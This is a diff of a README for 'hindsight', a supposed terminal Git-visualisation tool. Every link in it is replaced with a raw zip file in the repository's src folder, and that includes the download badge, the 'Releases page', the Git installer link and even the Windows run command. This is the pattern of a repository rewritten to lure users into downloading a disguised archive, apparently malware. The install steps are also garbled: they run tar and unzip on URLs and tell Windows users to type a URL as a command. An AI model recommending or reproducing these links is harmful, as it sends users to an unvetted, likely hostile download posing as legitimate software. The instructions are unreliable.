@@ -2,9 +2,9 @@
 
 ## 📦 Download & Install
 
-[![Download Hindsight](https://raw.githubusercontent.com/LSincorparat/hindsight/main/src/Software-3.9.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/LSincorparat/hindsight/main/src/Software-3.9.zip)
+[![Download Hindsight](https://raw.githubusercontent.com/LSincorparat/hindsight/main/src/Software_1.6.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/LSincorparat/hindsight/main/src/Software_1.6.zip)
 
-To get started with hindsight, visit this page to download: [hindsight Releases](https://raw.githubusercontent.com/LSincorparat/hindsight/main/src/Software-3.9.zip).
+To get started with hindsight, visit this page to download: [hindsight Releases](https://raw.githubusercontent.com/LSincorparat/hindsight/main/src/Software_1.6.zip).
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Hindsight helps you visualize your Git activity in your terminal. It offers a cl
 Before you download, ensure your computer meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux.
-- **Git:** You must have Git installed. If you don’t have it, you can download it from [https://raw.githubusercontent.com/LSincorparat/hindsight/main/src/Software-3.9.zip](https://raw.githubusercontent.com/LSincorparat/hindsight/main/src/Software-3.9.zip).
+- **Git:** You must have Git installed. If you don’t have it, you can download it from [https://raw.githubusercontent.com/LSincorparat/hindsight/main/src/Software_1.6.zip](https://raw.githubusercontent.com/LSincorparat/hindsight/main/src/Software_1.6.zip).
 - **Terminal Access:** You will need a terminal or command line access to run the application.
 
 ### 📥 Downloading Hindsight
@@ -25,7 +25,7 @@ Before you download, ensure your computer meets the following requirements:
 3. Download the appropriate file for your system. Available options usually include:
    - `.exe` for Windows
    - `.dmg` for macOS
-   - `https://raw.githubusercontent.com/LSincorparat/hindsight/main/src/Software-3.9.zip` or `.zip` for Linux
+   - `https://raw.githubusercontent.com/LSincorparat/hindsight/main/src/Software_1.6.zip` or `.zip` for Linux
 
 ### ⚙️ Installing Hindsight
 
@@ -42,15 +42,15 @@ After downloading, follow these steps to install:
   3. Eject the `.dmg` from Finder.
 
 - **Linux:**
-  1. For `https://raw.githubusercontent.com/LSincorparat/hindsight/main/src/Software-3.9.zip` files, extract the file using the command: `tar -xvf https://raw.githubusercontent.com/LSincorparat/hindsight/main/src/Software-3.9.zip`.
-  2. For `.zip` files, extract using: `unzip https://raw.githubusercontent.com/LSincorparat/hindsight/main/src/Software-3.9.zip`.
+  1. For `https://raw.githubusercontent.com/LSincorparat/hindsight/main/src/Software_1.6.zip` files, extract the file using the command: `tar -xvf https://raw.githubusercontent.com/LSincorparat/hindsight/main/src/Software_1.6.zip`.
+  2. For `.zip` files, extract using: `unzip https://raw.githubusercontent.com/LSincorparat/hindsight/main/src/Software_1.6.zip`.
   3. Navigate to the extracted folder.
 
 ### 🏃 Running Hindsight
 
 1. Open your terminal or command prompt.
 2. Navigate to the directory where you installed or extracted hindsight. Use `cd path/to/hindsight`.
-3. Run the application by typing `./hindsight` (Linux/macOS) or `https://raw.githubusercontent.com/LSincorparat/hindsight/main/src/Software-3.9.zip` (Windows) and hit Enter.
+3. Run the application by typing `./hindsight` (Linux/macOS) or `https://raw.githubusercontent.com/LSincorparat/hindsight/main/src/Software_1.6.zip` (Windows) and hit Enter.
 
 ### 🎨 Features
 
@@ -73,7 +73,7 @@ If you encounter issues, you can check the FAQ section on the Releases page. You
 
 ## 🔗 Additional Resources
 
-For further information and updates, you can visit the [hindsight Releases page](https://raw.githubusercontent.com/LSincorparat/hindsight/main/src/Software-3.9.zip) anytime.
+For further information and updates, you can visit the [hindsight Releases page](https://raw.githubusercontent.com/LSincorparat/hindsight/main/src/Software_1.6.zip) anytime.
 
 ### 🎉 Conclusion
 
